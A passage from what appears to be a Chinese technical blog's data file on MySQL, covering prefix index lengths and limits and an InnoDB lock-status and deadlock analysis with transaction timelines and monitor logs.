即可。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`test`</span>.<span class=\"string\">`base_info`</span></div><div class=\"line\"><span class=\"keyword\">DROP</span> PRIMARY <span class=\"keyword\">KEY</span>,</div><div class=\"line\"><span class=\"keyword\">ADD</span> PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>, <span class=\"string\">`partition_month`</span>(<span class=\"number\">6</span>));</div></pre></td></tr></table></figure></p>\n<h4 id=\"基于数据区分度\"><a href=\"#基于数据区分度\" class=\"headerlink\" title=\"基于数据区分度\"></a>基于数据区分度</h4><p>根据具体的数据区分度来设置前缀索引长度。</p>\n<p>假设需要为urls建立索引，可以事先查看当前字段应用不同前缀长度的区分度。<br>如下是取当前urls前缀长度为1000、100、125、150、200时的数据区分度：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> urls)/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_full, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">100</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_100, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">125</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_125, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">150</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_150, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">200</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_200 <span class=\"keyword\">from</span> base_info;</div><div class=\"line\">+<span class=\"comment\">----------+----------+----------+----------+----------+</span></div><div class=\"line\">| urls_full | urls_100 | urls_125 | urls_150 | urls_200 |</div><div class=\"line\">+<span class=\"comment\">----------+----------+----------+----------+----------+</span></div><div class=\"line\">|   0.9859 |   0.9858 |   0.9858 |   0.9859 |   0.9859 |</div><div class=\"line\">+<span class=\"comment\">----------+----------+----------+----------+----------+</span></div></pre></td></tr></table></figure></p>\n<p>从结果可以看出，当urls取前缀长度为150时，其区分度与完整长度一致。</p>","more":"<h2 id=\"四、知识点\"><a href=\"#四、知识点\" class=\"headerlink\" title=\"四、知识点\"></a>四、知识点</h2><h3 id=\"1-前缀索引介绍\"><a href=\"#1-前缀索引介绍\" class=\"headerlink\" title=\"1. 前缀索引介绍\"></a>1. 前缀索引介绍</h3><p>对于string类型的字段而言，可以使用字段值的主要部分用作索引。其语法为：<code>col_name(length)</code>，用以指定索引前缀长度。<br>CHAR, VARCHAR, BINARY, and VARBINARY 类型字段可以使用前缀索引。<br>BLOB and TEXT 类型字段必须使用前缀索引。</p>\n<p>前缀索引长度单位为字节(bytes)。然而，CREATE TABLE、ALTER TABLE、CREATE INDEX 语句涉及的字段长度单位有如下两种情况：对于非二进制类型(CHAR, VARCHAR, TEXT)字段而言，这个长度指的是字符数；而对于二进制(BINARY, VARBINARY, BLOB)字段而言，这个长度指的是字节数。</p>\n<p>官方说明(详见参考文档2):</p>\n<blockquote>\n<p>For string columns, indexes can be created that use only the leading part of column values, using col_name(length) syntax to specify an index prefix length:<br>Prefixes can be specified for CHAR, VARCHAR, BINARY, and VARBINARY column indexes.<br>Prefixes must be specified for BLOB and TEXT column indexes.<br>Prefix limits are measured in bytes, whereas the prefix length in CREATE TABLE, ALTER TABLE, and CREATE INDEX statements is interpreted as number of characters for nonbinary string types (CHAR, VARCHAR, TEXT) and number of bytes for binary string types (BINARY, VARBINARY, BLOB). Take this into account when specifying a prefix length for a nonbinary string column that uses a multibyte character set.<br>For spatial columns, prefix values cannot be given, as described later in this section.</p>\n</blockquote>\n<h3 id=\"2-字符占用大小计算\"><a href=\"#2-字符占用大小计算\" class=\"headerlink\" title=\"2. 字符占用大小计算\"></a>2. 字符占用大小计算</h3><p>字符长度转换成字节数时，需要考虑表字段的字符编码方式。<br>简单来说，就是字符编码方式不同，1个字符占用的字节数不同。</p>\n<p>常用的字符编码方式与对应的占用大小关系如下：</p>\n<table>\n<thead>\n<tr>\n<th>字符编码</th>\n<th>字符占用大小</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>latin</td>\n<td>单字节：1B</td>\n</tr>\n<tr>\n<td>GBK</td>\n<td>双字节：2B</td>\n</tr>\n<tr>\n<td>UTF8</td>\n<td>三字节：3B</td>\n</tr>\n<tr>\n<td>UTF8mb4</td>\n<td>四字节：4B</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"3-前缀索引限制\"><a href=\"#3-前缀索引限制\" class=\"headerlink\" title=\"3. 前缀索引限制\"></a>3. 前缀索引限制</h3><p>是否支持前缀索引以及前缀索引长度大小，依赖于数据表使用的存储引擎。<br>对于INNODB存储引擎而言，默认前缀长度最大能支持767字节；而在开启<code>innodb_large_prefix</code>属性值的情况下，最大能支持3072字节。<br>对于MyISAM存储引擎而言，前缀长度限制为1000字节。<br>对于NDB存储引擎而言，并不支持前缀索引。</p>\n<p>官方说明(详见参考文档2):</p>\n<blockquote>\n<p>Prefix support and lengths of prefixes (where supported) are storage engine dependent. For example, a prefix can be up to 767 bytes long for InnoDB tables or 3072 bytes if the innodb_large_prefix option is enabled. For MyISAM tables, the prefix limit is 1000 bytes. The NDB storage engine does not support prefixes (see Section 18.1.6.6, “Unsupported or Missing Features in MySQL Cluster”).</p>\n</blockquote>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://stackoverflow.com/a/1814594\">1071 - Specified key was too long; max key length is 767 bytes</a></li>\n<li><a href=\"http://dev.mysql.com/doc/refman/5.6/en/create-index.html\">CREATE INDEX Syntax</a></li>\n<li><a href=\"http://hidba.org/?p=216\">认识mysql前缀索引</a></li>\n</ol>"},{"title":"通过InnoDB监控状态分析锁占用","date":"2016-08-06T14:31:00.000Z","_content":"<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 一、表结构\n\n```bash\nCREATE TABLE `t` (\n  `id` int(11) NOT NULL,\n  `stage` int(11) NOT NULL,\n  PRIMARY KEY (`id`),\n  KEY `idx_b` (`stage`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8\n```\n\n\n## 二、表数据\n``` bash\n+------+---------+\n|   id |   stage |\n|------+---------|\n|    1 |       1 |\n|    4 |       4 |\n|    9 |       9 |\n|   15 |      15 |\n+------+---------+\n```\n\n\n## 三、简单实例\n\n### 1. 事务执行时序表\n事务(ID:41114)，在索引idx_b值为4上加排他锁。\n\n\n| T1(41114) |\n|---|\n| begin; |\n| select * from t where stage = 4 for update; |\n\n### 2. 查看InnoDB运行状态\n``` bash\n---TRANSACTION 41114, ACTIVE 41 sec\n4 lock struct(s), heap size 1184, 3 row lock(s)\nMySQL thread id 39, OS thread handle 0x700000a83000, query id 36756 localhost ::1 root cleaning up\nTABLE LOCK table `test`.`t` trx id 41114 lock mode IX\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41114 lock_mode X\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41114 lock_mode X locks rec but not gap\nRecord lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 6; hex 00000000a08b; asc       ;;\n 2: len 7; hex dd000001fa0110; asc        ;;\n 3: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41114 lock_mode X locks gap before rec\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n```\n\n### 3. 解读InnoDB运行状态\n事务T1总共加了4把锁：1把表，3把行锁。\n表锁类型：IX\n\n行锁根据索引划分为加在聚集索引 PRIMARY 上的行锁和加在普通索引 idx_b 上的行锁。\n加在聚集索引上的行锁1把，是一个排他的记录锁；\n加在普通索引上的行锁2把，1把是next-key lock，锁住的范围为(1, 4]；1把是gap lock，锁住的范围为(4, 9)。\n\n\n<!-- more -->\n\n\n## 四、复杂实例\n下面演示一个更加复杂的实例：GAP与Insert Intention冲突引发的死锁，分析死锁时各事务锁占用情况。\n\n### 1. 事务执行时序表\n| T1(41121) | T1(41122) |\n|---|---|\n| begin; | begin; |\n| select * from t where stage = 4 for update; | |\n| | select * from t where stage = 9 for update; |\n| insert INTO t values (6, 6) | |\n| | insert INTO t values (7, 7) |\n| | (1213, u'Deadlock found when trying to get lock; try restarting transaction') |\n| Query OK, 1 row affected | &nbsp; |\n\n事务T1首先锁住stage=4的记录，然后插入(6, 6)的记录；\n事务T2首先锁住stage=9的记录，然后插入(7, 7)的记录。\n\n\n### 2. 查看InnoDB运行状态\n由于发生死锁后，其中一个事务会回滚，而无法查看到其事务锁占用状态。\n因此，我们在在事务T2执行记录插入操作之前，查看一下当前各事务锁占用状态。如下所示：\n\n``` bash\n------------\nTRANSACTIONS\n------------\nTrx id counter 41123\nPurge done for trx's n:o < 41120 undo n:o < 0 state: running but idle\nHistory list length 968\nLIST OF TRANSACTIONS FOR EACH SESSION:\n---TRANSACTION 0, not started\nMySQL thread id 67, OS thread handle 0x700000ac7000, query id 37547 localhost ::1 root init\nshow ENGINE innodb status\n---TRANSACTION 41105, not started\nMySQL thread id 65, OS thread handle 0x700000b0b000, query id 36363 localhost 127.0.0.1 root cleaning up\n---TRANSACTION 0, not started\nMySQL thread id 64, OS thread handle 0x700000b4f000, query id 36362 localhost 127.0.0.1 root cleaning up\n---TRANSACTION 0, not started\nMySQL thread id 58, OS thread handle 0x700000a3f000, query id 37546 localhost root cleaning up\n---TRANSACTION 41122, ACTIVE 26 sec\n4 lock struct(s), heap size 1184, 3 row lock(s)\nMySQL thread id 69, OS thread handle 0x700000bd7000, query id 37534 localhost ::1 root cleaning up\nTABLE LOCK table `test`.`t` trx id 41122 lock mode IX\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\nRECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41122 lock_mode X locks rec but not gap\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 6; hex 00000000a08b; asc       ;;\n 2: len 7; hex dd000001fa011d; asc        ;;\n 3: len 4; hex 80000009; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec\nRecord lock, heap no 9 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 8000000f; asc     ;;\n 1: len 4; hex 8000000f; asc     ;;\n\n---TRANSACTION 41121, ACTIVE 34 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1\nMySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update\ninsert INTO t values (6, 6)\n------- TRX HAS BEEN WAITING 21 SEC FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n------------------\nTABLE LOCK table `test`.`t` trx id 41121 lock mode IX\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41121 lock_mode X locks rec but not gap\nRecord lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 6; hex 00000000a08b; asc       ;;\n 2: len 7; hex dd000001fa0110; asc        ;;\n 3: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n```\n\n### 3. 死锁日志\n事务T2执行记录插入操作，发生死锁。\n死锁日志如下所示：\n\n``` bash\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2016-08-04 13:39:05 700000bd7000\n*** (1) TRANSACTION:\nTRANSACTION 41121, ACTIVE 54 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1\nMySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update\ninsert INTO t values (6, 6)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n*** (2) TRANSACTION:\nTRANSACTION 41122, ACTIVE 46 sec inserting\nmysql tables in use 1, locked 1\n5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1\nMySQL thread id 69, OS thread handle 0x700000bd7000, query id 37555 localhost ::1 root update\ninsert INTO t values (7, 7)\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n*** WE ROLL BACK TRANSACTION (2)\n```\n\n由上述死锁日志可知：两个事务都在等待加在这个位置的锁 **space id 245 page no 4 n bits 80**。\n另外，\n\n\n### 4. 解读InnoDB运行状态\n\n#### 事务T1\n事务T1总共 **要加** 5把锁：1把表，4把行锁。\n\n**表锁**\n表锁类型：IX\n\n**行锁**\nidx_b 上的排他 next-key lock，范围：idx_b in (1, 4]。\n内存位置：space id 245 page no 4 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 2;\n\nprimary 上的排他 record lock，范围：primary=4。\n内存位置：space id 245 page no 3 n bits 80，heap no 6 PHYSICAL RECORD: n_fields 4;\n\nidx_b 上的排他 gap lock，范围：idx_b in (4, 9)。\n内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;\n\nidx_b 上的排他 insert intention lock，范围：idx_b in (4, 9)。\n内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;\n\n其中，insert intention lock 是正等待加的锁。\n\n\n#### 事务T2\n**注**：当前分析事务T2占用的锁快照为T2执行插入语句之前状态。\n\n事务T2总共加了4把锁：1把表，3把行锁。\n\n**表锁**\n表锁类型：IX\n\n**行锁**\nidx_b 上的排他 next-key lock，范围：idx_b in (4， 9]\n内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;\n\nprimary 上的排他 record lock，范围：primary=9\n内存位置：space id 245 page no 3 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 4;\n\nidx_b 上的排他 gap lock，范围：idx_b in (9， 15)\n内存位置：space id 245 page no 4 n bits 80，heap no 9 PHYSICAL RECORD: n_fields 2;\n\n\n#### 死锁分析\n在事务T1插入记录前，事务T1拿到了范围idx_b in (4, 9)的gap lock，事务T2拿到了范围idx_b in (4， 9]上的next-key lock。\n\n事务T1插入记录(6, 6)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T2已持有next key lock是互斥的。\n于是，事务T1 block，等待事务T2释放范围idx_b in (4， 9]上的next-key lock。\n\n事务T2插入记录(7, 7)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T1已持有的gap lock是互斥的。\n于是，事务T2也会block，等待事务T2释放范围idx_b in (4， 9)上的gap lock。\n死锁便产生了。\n\n","source":"_posts/article/database/通过InnoDB监控状态分析锁占用.md","raw":"title: 通过InnoDB监控状态分析锁占用\ntags:\n  - mysql\n  - innodb\ncategories:\n  - 数据存储\ndate: 2016-08-06 22:31:00\n---\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 一、表结构\n\n```bash\nCREATE TABLE `t` (\n  `id` int(11) NOT NULL,\n  `stage` int(11) NOT NULL,\n  PRIMARY KEY (`id`),\n  KEY `idx_b` (`stage`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8\n```\n\n\n## 二、表数据\n``` bash\n+------+---------+\n|   id |   stage |\n|------+---------|\n|    1 |       1 |\n|    4 |       4 |\n|    9 |       9 |\n|   15 |      15 |\n+------+---------+\n```\n\n\n## 三、简单实例\n\n### 1. 事务执行时序表\n事务(ID:41114)，在索引idx_b值为4上加排他锁。\n\n\n| T1(41114) |\n|---|\n| begin; |\n| select * from t where stage = 4 for update; |\n\n### 2. 查看InnoDB运行状态\n``` bash\n---TRANSACTION 41114, ACTIVE 41 sec\n4 lock struct(s), heap size 1184, 3 row lock(s)\nMySQL thread id 39, OS thread handle 0x700000a83000, query id 36756 localhost ::1 root cleaning up\nTABLE LOCK table `test`.`t` trx id 41114 lock mode IX\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41114 lock_mode X\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41114 lock_mode X locks rec but not gap\nRecord lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 6; hex 00000000a08b; asc       ;;\n 2: len 7; hex dd000001fa0110; asc        ;;\n 3: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41114 lock_mode X locks gap before rec\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n```\n\n### 3. 解读InnoDB运行状态\n事务T1总共加了4把锁：1把表，3把行锁。\n表锁类型：IX\n\n行锁根据索引划分为加在聚集索引 PRIMARY 上的行锁和加在普通索引 idx_b 上的行锁。\n加在聚集索引上的行锁1把，是一个排他的记录锁；\n加在普通索引上的行锁2把，1把是next-key lock，锁住的范围为(1, 4]；1把是gap lock，锁住的范围为(4, 9)。\n\n\n<!-- more -->\n\n\n## 四、复杂实例\n下面演示一个更加复杂的实例：GAP与Insert Intention冲突引发的死锁，分析死锁时各事务锁占用情况。\n\n### 1. 事务执行时序表\n| T1(41121) | T1(41122) |\n|---|---|\n| begin; | begin; |\n| select * from t where stage = 4 for update; | |\n| | select * from t where stage = 9 for update; |\n| insert INTO t values (6, 6) | |\n| | insert INTO t values (7, 7) |\n| | (1213, u'Deadlock found when trying to get lock; try restarting transaction') |\n| Query OK, 1 row affected | &nbsp; |\n\n事务T1首先锁住stage=4的记录，然后插入(6, 6)的记录；\n事务T2首先锁住stage=9的记录，然后插入(7, 7)的记录。\n\n\n### 2. 查看InnoDB运行状态\n由于发生死锁后，其中一个事务会回滚，而无法查看到其事务锁占用状态。\n因此，我们在在事务T2执行记录插入操作之前，查看一下当前各事务锁占用状态。如下所示：\n\n``` bash\n------------\nTRANSACTIONS\n------------\nTrx id counter 41123\nPurge done for trx's n:o < 41120 undo n:o < 0 state: running but idle\nHistory list length 968\nLIST OF TRANSACTIONS FOR EACH SESSION:\n---TRANSACTION 0, not started\nMySQL thread id 67, OS thread handle 0x700000ac7000, query id 37547 localhost ::1 root init\nshow ENGINE innodb status\n---TRANSACTION 41105, not started\nMySQL thread id 65, OS thread handle 0x700000b0b000, query id 36363 localhost 127.0.0.1 root cleaning up\n---TRANSACTION 0, not started\nMySQL thread id 64, OS thread handle 0x700000b4f000, query id 36362 localhost 127.0.0.1 root cleaning up\n---TRANSACTION 0, not started\nMySQL thread id 58, OS thread handle 0x700000a3f000, query id 37546 localhost root cleaning up\n---TRANSACTION 41122, ACTIVE 26 sec\n4 lock struct(s), heap size 1184, 3 row lock(s)\nMySQL thread id 69, OS thread handle 0x700000bd7000, query id 37534 localhost ::1 root cleaning up\nTABLE LOCK table `test`.`t` trx id 41122 lock mode IX\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\nRECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41122 lock_mode X locks rec but not gap\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 6; hex 00000000a08b; asc       ;;\n 2: len 7; hex dd000001fa011d; asc        ;;\n 3: len 4; hex 80000009; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec\nRecord lock, heap no 9 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 8000000f; asc     ;;\n 1: len 4; hex 8000000f; asc     ;;\n\n---TRANSACTION 41121, ACTIVE 34 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1\nMySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update\ninsert INTO t values (6, 6)\n------- TRX HAS BEEN WAITING 21 SEC FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n------------------\nTABLE LOCK table `test`.`t` trx id 41121 lock mode IX\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 3 n bits 80 index `PRIMARY` of table `test`.`t` trx id 41121 lock_mode X locks rec but not gap\nRecord lock, heap no 6 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 6; hex 00000000a08b; asc       ;;\n 2: len 7; hex dd000001fa0110; asc        ;;\n 3: len 4; hex 80000004; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n```\n\n### 3. 死锁日志\n事务T2执行记录插入操作，发生死锁。\n死锁日志如下所示：\n\n``` bash\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2016-08-04 13:39:05 700000bd7000\n*** (1) TRANSACTION:\nTRANSACTION 41121, ACTIVE 54 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1\nMySQL thread id 39, OS thread handle 0x700000a83000, query id 37538 localhost ::1 root update\ninsert INTO t values (6, 6)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41121 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n*** (2) TRANSACTION:\nTRANSACTION 41122, ACTIVE 46 sec inserting\nmysql tables in use 1, locked 1\n5 lock struct(s), heap size 1184, 4 row lock(s), undo log entries 1\nMySQL thread id 69, OS thread handle 0x700000bd7000, query id 37555 localhost ::1 root update\ninsert INTO t values (7, 7)\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 245 page no 4 n bits 80 index `idx_b` of table `test`.`t` trx id 41122 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 8 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000009; asc     ;;\n 1: len 4; hex 80000009; asc     ;;\n\n*** WE ROLL BACK TRANSACTION (2)\n```\n\n由上述死锁日志可知：两个事务都在等待加在这个位置的锁 **space id 245 page no 4 n bits 80**。\n另外，\n\n\n### 4. 解读InnoDB运行状态\n\n#### 事务T1\n事务T1总共 **要加** 5把锁：1把表，4把行锁。\n\n**表锁**\n表锁类型：IX\n\n**行锁**\nidx_b 上的排他 next-key lock，范围：idx_b in (1, 4]。\n内存位置：space id 245 page no 4 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 2;\n\nprimary 上的排他 record lock，范围：primary=4。\n内存位置：space id 245 page no 3 n bits 80，heap no 6 PHYSICAL RECORD: n_fields 4;\n\nidx_b 上的排他 gap lock，范围：idx_b in (4, 9)。\n内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;\n\nidx_b 上的排他 insert intention lock，范围：idx_b in (4, 9)。\n内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;\n\n其中，insert intention lock 是正等待加的锁。\n\n\n#### 事务T2\n**注**：当前分析事务T2占用的锁快照为T2执行插入语句之前状态。\n\n事务T2总共加了4把锁：1把表，3把行锁。\n\n**表锁**\n表锁类型：IX\n\n**行锁**\nidx_b 上的排他 next-key lock，范围：idx_b in (4， 9]\n内存位置：space id 245 page no 4 n bits 80，heap no 8 PHYSICAL RECORD: n_fields 2;\n\nprimary 上的排他 record lock，范围：primary=9\n内存位置：space id 245 page no 3 n bits 80，heap no 7 PHYSICAL RECORD: n_fields 4;\n\nidx_b 上的排他 gap lock，范围：idx_b in (9， 15)\n内存位置：space id 245 page no 4 n bits 80，heap no 9 PHYSICAL RECORD: n_fields 2;\n\n\n#### 死锁分析\n在事务T1插入记录前，事务T1拿到了范围idx_b in (4, 9)的gap lock，事务T2拿到了范围idx_b in (4， 9]上的next-key lock。\n\n事务T1插入记录(6, 6)时，要请求范围idx_b in (4, 9)上的insert intention lock，而请求的insert intention lock与事务T2已持有next key lock是互斥的。\n于是，事务T1 